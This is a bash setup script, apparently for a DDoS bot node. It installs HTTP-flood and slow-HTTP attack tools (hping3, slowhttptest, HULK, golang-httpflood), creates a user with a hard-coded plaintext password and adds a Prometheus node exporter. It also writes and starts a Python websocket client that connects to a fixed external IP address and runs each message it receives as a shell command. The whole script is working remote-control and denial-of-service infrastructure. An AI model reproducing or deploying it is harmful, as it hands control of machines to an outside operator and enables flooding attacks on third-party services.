#!/bin/bash
apt update -y
apt install git hping3 python3-pip python3-websockets golang-go slowhttptest -y

git clone https://github.com/grafov/hulk /root/hulk
git clone https://github.com/Leeon123/golang-httpflood.git /root/golang-httpflood


pip install locust==2.15.0 --break-system-packages
pip install beautifulsoup4==4.12.2 --break-system-packages
pip install redis==5.0.0 --break-system-packages

SERVER_PORT="8765"
SERVER_ADDR="165.227.111.141"

cat <<EOF > /root/wsclient.py
import asyncio
import websockets
import threading
import subprocess
import time

def process_message(message):
	print(f"Çalıştırılan komut: {message}")
	try:
		output = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT)
		print(output.decode())
	except subprocess.CalledProcessError as e:
		print(f"Komut hatası: {e.output.decode()}")

async def client():
	while True:
		try:
			async with websockets.connect("ws://$SERVER_ADDR:$SERVER_PORT") as websocket:
				async for message in websocket:
					t = threading.Thread(target=process_message, args=(message,))
					t.start()
		except (websockets.ConnectionClosed, ConnectionRefusedError, OSError):
			print("Bağlantı kaybedildi, yeniden bağlanmaya çalışılıyor...")
			time.sleep(3)  # 5 saniye bekleyin ve yeniden deneyin

asyncio.get_event_loop().run_until_complete(client())

EOF


useradd prometheus
echo "turkuaz_290" | passwd --stdin prometheus

export NODE_EXPORTER_VERSION="1.6.1"


wget https://github.com/prometheus/node_exporter/releases/download/v1.6.1/node_exporter-1.6.1.linux-amd64.tar.gz
tar xvfz node_exporter-1.6.1.linux-amd64.tar.gz
cd node_exporter-1.6.1.linux-amd64
sudo cp node_exporter /usr/local/bin/

cat <<EOF | sudo tee /etc/systemd/system/node_exporter.service
[Unit]
Description=Prometheus Node Exporter
Wants=network-online.target
After=network-online.target

[Service]
User=prometheus
Group=prometheus
Type=simple
ExecStart=/usr/local/bin/node_exporter

[Install]
WantedBy=default.target
EOF


sudo systemctl daemon-reload
sudo systemctl start node_exporter
sudo systemctl enable node_exporter


python3 /root/wsclient.py &
